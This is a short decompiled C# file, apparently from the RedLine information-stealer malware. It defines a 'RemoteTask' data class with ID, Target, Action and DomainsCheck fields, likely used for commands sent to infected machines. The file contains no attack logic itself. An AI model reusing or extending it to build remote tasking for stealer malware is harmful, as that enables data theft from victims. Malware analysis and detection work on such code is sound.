using System;
using System.Runtime.Serialization;

namespace RedLine.Models
{
	// Token: 0x02000015 RID: 21
	[DataContract(Name = "RemoteTask", Namespace = "v1/Models")]
	public class RemoteTask
	{
		// Token: 0x17000030 RID: 48
		// (get) Token: 0x06000080 RID: 128 RVA: 0x00003530 File Offset: 0x00001730
		// (set) Token: 0x06000081 RID: 129 RVA: 0x00003538 File Offset: 0x00001738
		[DataMember(Name = "ID")]
		public int ID { get; set; }

		// Token: 0x17000031 RID: 49
		// (get) Token: 0x06000082 RID: 130 RVA: 0x00003541 File Offset: 0x00001741
		// (set) Token: 0x06000083 RID: 131 RVA: 0x00003549 File Offset: 0x00001749
		[DataMember(Name = "Target")]
		public string Target { get; set; }

		// Token: 0x17000032 RID: 50
		// (get) Token: 0x06000084 RID: 132 RVA: 0x00003552 File Offset: 0x00001752
		// (set) Token: 0x06000085 RID: 133 RVA: 0x0000355A File Offset: 0x0000175A
		[DataMember(Name = "Action")]
		public RemoteTaskAction Action { get; set; }

		// Token: 0x17000033 RID: 51
		// (get) Token: 0x06000086 RID: 134 RVA: 0x00003563 File Offset: 0x00001763
		// (set) Token: 0x06000087 RID: 135 RVA: 0x0000356B File Offset: 0x0000176B
		[DataMember(Name = "DomainsCheck")]
		public string DomainsCheck { get; set; }
	}
}
